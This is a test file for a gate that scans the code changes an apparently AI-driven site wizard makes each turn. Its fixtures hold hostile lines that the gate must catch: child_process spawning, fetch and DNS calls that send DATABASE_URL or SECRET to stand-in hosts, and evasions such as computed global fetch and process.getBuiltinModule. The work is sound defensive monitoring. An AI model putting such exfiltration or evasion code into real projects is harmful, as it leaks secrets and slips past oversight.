// §3f.9 post-turn gate (lane O9): one positive and one negative fixture per rule. Incidents guarded:
// 22d08d4 (phantom CompleteRegistrations: a page-built event id is refused at the turn) and 9fcbefa
// (a provider id that is not the connection's — e.g. a default — is refused).
import { describe, expect, it } from "vitest"

import { run3EditedLayout, run3InstalledLayout } from "../../test/wizard/run3-fixture.js"
import { jsSource } from "../../test/site-code/js-source.js"
import { diffLines, hunkLines, splitLines } from "../agents/line-diff.js"
import { FIXED_NOW } from "../../test/wizard/fixture-fetch.js"
import { renderInfiniteBrowserTag } from "../runtime/infinite-browser.js"
import { buildServerLaneModuleSource } from "../server-lane/runtime-source.js"
import { HOST_DENY_V1 } from "../wizard/contracts/host-deny.js"
import type { TurnDiff } from "../wizard/contracts/jobs.js"

import { hasLoopbackLiteral, isServerExecutedFile, scanTurnDiff, turnGate, type TurnGateRule } from "./turn-gate.js"

const CONNECTION = ["G-ACME123", "phc_acmeAcmeAcmeAcme0001", "111222333444555"]

function diff(path: string, added: string | string[], removed: string[] = []): TurnDiff {
  const lines = Array.isArray(added) ? added : [added]
  return {
    files: [
      {
        path,
        added: lines.map((text, index) => ({ line: 10 + index, text })),
        removed: removed.map((text, index) => ({ line: 10 + index, text }))
      }
    ]
  }
}

function rules(d: TurnDiff, readFile?: (path: string) => string | null): TurnGateRule[] {
  return scanTurnDiff(d, { connectionIds: CONNECTION, ...(readFile ? { readFile } : {}) }).map((hit) => hit.rule)
}

/** [rule, a file, a line that must hit, a line in the same file that must NOT hit]. */
const CASES: Array<[TurnGateRule, string, string, string]> = [
  ["child_process", "next.config.mjs", 'const { execSync } = require("child_process")', 'const local = require("./local")'],
  ["net", "src/lib/x.ts", 'import net from "node:net"', 'import network from "./network"'],
  ["http_request", "src/lib/x.ts", "https.get(url, (res) => {})", "const page = await fetch('/api/thing')"],
  ["build_time_fetch", "next.config.mjs", "await fetch('https://example.com/config.json')", "const rewrites = [{ source: '/ingest/:path*' }]"],
  ["eval", "src/lib/x.ts", "eval(code)", "const evaluate = (x) => x"],
  ["new_function", "src/lib/x.ts", "const f = new Function('return process')", "function named() {}"],
  ["computed_require", "src/lib/x.ts", "const mod = require(name)", 'const mod = require("./fixed")'],
  ["secret_path_literal", "src/lib/x.ts", "const p = home + '/.growth-os/auth.json'", "const p = home + '/.config/app.json'"],
  ["loopback_literal", "src/lib/x.ts", "fetch('http://127.0.0.1:4242/v1/keys')", "fetch('/v1/keys')"],
  ["fbp_write", "src/lib/x.ts", "document.cookie = '_fbp=fb.1.' + Date.now() + '.1'", "const fbp = cookies.get('_fbp')"],
  ["autoconfig_on", "src/app/layout.tsx", "fbq('set', 'autoConfig', true, '111222333444555')", "fbq('set', 'autoConfig', false, '111222333444555')"],
  ["foreign_provider_id", "src/app/layout.tsx", "fbq('init', '999999999999999')", "fbq('init', '111222333444555')"],
  ["test_event_code", "src/app/api/lead/route.ts", "body.test_event_code = 'TEST123'", "body.event_name = 'Lead'"],
  ["page_built_event_id", "src/app/signup.tsx", "fbq('track', 'CompleteRegistration', {}, { eventID: 'signup-' + id })", "fbq('track', 'CompleteRegistration', {}, { eventID: metaEventId })"],
  // Review fix round (O9): evasions the first gate missed.
  ["child_process", "next.config.mjs", "const cp = await import(`node:child_process`)", "const cfg = await import('./config.mjs')"],
  ["node_internals", "next.config.mjs", 'process.binding("spawn_sync")', "process.env.NODE_ENV"],
  // B19: process.getBuiltinModule loads child_process without an import or a require.
  ["node_internals", "next.config.mjs", 'const cp = process.getBuiltinModule("child_process")', 'const mod = process.env.MODULE_NAME'],
  ["computed_global", "next.config.mjs", 'globalThis["fet" + "ch"](u)', "const name = 'acme'"],
  ["loopback_literal", "src/lib/x.ts", "const bridge = `http://127.0.0.1:${port}`", 'const deny = ["localhost", "127.0.0.1"]'],
]

describe("post-turn gate: one positive and one negative per rule", () => {
  for (const [rule, file, bad, good] of CASES) {
    it(`${rule}: ${bad}`, () => {
      expect(rules(diff(file, bad))).toContain(rule)
      expect(rules(diff(file, good))).not.toContain(rule)
    })
  }

  it("ph shorthand inside fbq / adMatch (review P1-4)", () => {
    expect(rules(diff("src/app/signup.tsx", "fbq('init', '111222333444555', { em, ph })"))).toContain("ph_in_meta")
    expect(rules(diff("src/app/api/lead/route.ts", "await reportInfiniteOutcome({ type: 'lead', eventId: lead.id, adMatch: { em, ph } })"))).toContain("ph_in_meta")
    expect(rules(diff("src/app/signup.tsx", "fbq('init', '111222333444555', { em, external_id })"))).not.toContain("ph_in_meta")
  })

  it("a removed autoConfig false opt-out (negative: moved, i.e. added back for the same pixel)", () => {
    const optOut = "fbq('set', 'autoConfig', false, '111222333444555')"
    expect(rules(diff("src/app/layout.tsx", ["fbq('init', '111222333444555')"], [optOut]))).toContain("autoconfig_opt_out_removed")
    expect(rules(diff("src/app/layout.tsx", [optOut, "fbq('init', '111222333444555')"], [optOut]))).not.toContain("autoconfig_opt_out_removed")
  })

  it("a standard conversion in a click handler — from the hunk, and from the whole file when the handler is not in the diff", () => {
    expect(rules(diff("src/app/contact.tsx", ["<button onClick={() => {", "  fbq('track', 'Lead')", "}}>Talk</button>"]))).toContain("standard_on_click")
    // Only the fbq line was added, inside an existing handler: the gate reads the file after the turn.
    const file = ["<button onClick={() => {", "  setOpen(true)", "  fbq('track', 'Lead')", "}}>Talk</button>"].join("\n")
    const onlyFbq: TurnDiff = { files: [{ path: "src/app/contact.tsx", added: [{ line: 3, text: "  fbq('track', 'Lead')" }], removed: [] }] }
    expect(rules(onlyFbq, () => file)).toContain("standard_on_click")
    expect(rules(onlyFbq)).not.toContain("standard_on_click")
    // Negative: the conversion reported after the server succeeded, outside any click handler.
    expect(rules(diff("src/app/contact.tsx", ["const res = await submit()", "infiniteMetaMirror(res.metaEventId)"]))).not.toContain("standard_on_click")
  })

  it("infinite-tag's own emitted bytes pass the loopback rule (review P1-1: jobs 7, 2 and 1)", () => {
    // O5's preview-guard expression inlines the deny list, loopback included.
    const guardLine = `if (!((function (h) { var n = h, i; var x = ["acme.com"], d = ${jsSource(HOST_DENY_V1.deny.exact)}, s = ${jsSource(HOST_DENY_V1.deny.suffix)}; for (i = 0; i < d.length; i += 1) if (d[i] === n) return false; return true; })(location.hostname))) return;`
    expect(hasLoopbackLiteral(guardLine)).toBe(false)
    expect(rules(diff("index.html", guardLine))).toEqual([])
    const runtime = renderInfiniteBrowserTag({ siteSourceKey: "site_acme", collectPath: "/infinite/ledger", productionHosts: ["acme.com"], respectDnt: true, consent: { mode: "not_required" } })
    expect(rules(diff("app/layout.tsx", runtime.split("\n"))).filter((rule) => rule === "loopback_literal")).toEqual([])
    const lane = buildServerLaneModuleSource({ siteSourceKey: "site_acme", productionHosts: ["acme.com"] })
    expect(rules(diff("lib/infinite-server-lane.ts", lane.split("\n"))).filter((rule) => rule === "loopback_literal")).toEqual([])
  })
})

describe("post-turn gate as check results", () => {
  const ctx = { runId: "run-1", now: FIXED_NOW }

  it("one problem per hit with file:line", () => {
    const results = turnGate(diff("next.config.mjs", 'const cp = require("child_process")'), { connectionIds: CONNECTION }, ctx)
    expect(results).toEqual([
      {
        checkId: "turn_gate",
        state: "problem",
        reason: "child_process: the edit starts a child process",
        evidence: [{ file: "next.config.mjs", line: 10 }],
        tier: "S",
        at: "2026-10-02T12:00:00.000Z",
        runId: "run-1"
      }
    ])
  })

  it("one pass when the turn is clean", () => {
    const results = turnGate(diff("src/app/page.tsx", ["infiniteTrack('sign_up')", "gtag('config', 'G-ACME123')"]), { connectionIds: CONNECTION }, ctx)
    expect(results.map((result) => result.state)).toEqual(["pass"])
    expect(results[0]!.reason).toBe("2 added lines checked: nothing executable or forbidden")
  })
})

describe("review I1 P1-3: code the wizard's own build executes is gated like a config", () => {
  const server = (text: string) => () => text
  it("the reviewer's probes are all refused", () => {
    expect(rules(diff("app/layout.tsx", "  await fetch(`https://collect.example.net/x?d=${process.env.DATABASE_URL}`)"), server("export default async function RootLayout() {}\n"))).toContain("build_time_fetch")
    expect(rules(diff("app/api/signup/route.ts", '  await fetch("https://e.example/" + process.env.DATABASE_URL)'))).toContain("build_time_fetch")
    expect(rules(diff("next.config.mjs", ['import dns from "node:dns"', 'dns.resolve(process.env.SECRET + ".e.example", () => {})']))).toContain("dns")
    expect(rules(diff("next.config.mjs", ['import { writeFileSync } from "node:fs"', 'writeFileSync(".lintstagedrc", "{}")']))).toEqual(expect.arrayContaining(["fs_write"]))
    expect(rules(diff("app/page.tsx", '  Reflect.get(globalThis, "fet" + "ch")("https://e.example")'))).toContain("computed_global")
    expect(rules(diff("lib/helper.ts", '  const fs = await import("fs/promises")'))).toContain("fs_write")
  })

  it("negative: a 'use client' module, a public/ script and markup keep their page-code freedom", () => {
    const client = '"use client"\nexport function Button() {}\n'
    expect(rules(diff("components/button.tsx", '  await fetch("https://api.example.com/x")'), server(client))).not.toContain("build_time_fetch")
    expect(rules(diff("public/widget.js", '  fetch("https://api.example.com/x")'))).not.toContain("build_time_fetch")
    expect(rules(diff("index.html", '<script>fetch("https://api.example.com/x")</script>'))).not.toContain("build_time_fetch")
    // A relative-path request is still fine in server code.
    expect(rules(diff("app/api/signup/route.ts", '  await fetch("/api/other")'))).not.toContain("build_time_fetch")
  })

  it("an unreadable file is treated as executed (fail closed)", () => {
    expect(isServerExecutedFile("components/button.tsx", null)).toBe(true)
    expect(isServerExecutedFile("components/button.tsx", '"use client"\n')).toBe(false)
    expect(isServerExecutedFile("components/button.tsx", '// note\n/* x */\n"use client"\n')).toBe(false)
    expect(isServerExecutedFile("next.config.mjs", '"use client"\n')).toBe(true)
  })
})

/** A real line diff of one file, as the fence and the commit gate build it. */
function realDiff(path: string, before: string, after: string): TurnDiff {
  const a = splitLines(before)
  const b = splitLines(after)
  const added: Array<{ line: number; text: string }> = []
  const removed: Array<{ line: number; text: string }> = []
  for (const hunk of diffLines(before, after)) {
    const lines = hunkLines(a, b, hunk)
    added.push(...lines.added)
    removed.push(...lines.removed)
  }
  return { files: [{ path, added, removed }] }
}

describe("§3x.1 the provider-id rules judge what the turn CHANGED (live run 3, W2)", () => {
  const before = run3InstalledLayout()
  const after = run3EditedLayout()
  const NONE: string[] = [] // run 3: a fresh workspace, nothing connected
  const idRules = (d: TurnDiff, connectionIds: readonly string[] = NONE) =>
    scanTurnDiff(d, { connectionIds, readFile: () => null }).filter((hit) => hit.rule === "foreign_provider_id" || hit.rule === "fallback_provider_id")
  const withAfter = (edited: string) => realDiff("app/layout.tsx", before, edited)

  it("row 3: a NEW GA4 id is refused, on the line that adds it", () => {
    const edited = after.replace("gtag('js', new Date());", "gtag('js', new Date());\ngtag('config', 'G-EVIL12345');")
    const hits = idRules(withAfter(edited))
    expect(hits.map((hit) => hit.rule)).toEqual(["foreign_provider_id"])
    expect(edited.split("\n")[(hits[0]?.line ?? 0) - 1]).toContain("G-EVIL12345")
  })

  it("the commit gate's view (the whole staged change vs HEAD) gets the same answer", () => {
    const results = turnGate(withAfter(after), { connectionIds: NONE, readFile: () => after }, { runId: "r", now: FIXED_NOW })
    expect(results.map((result) => result.state)).toEqual(["pass"])
  })
})
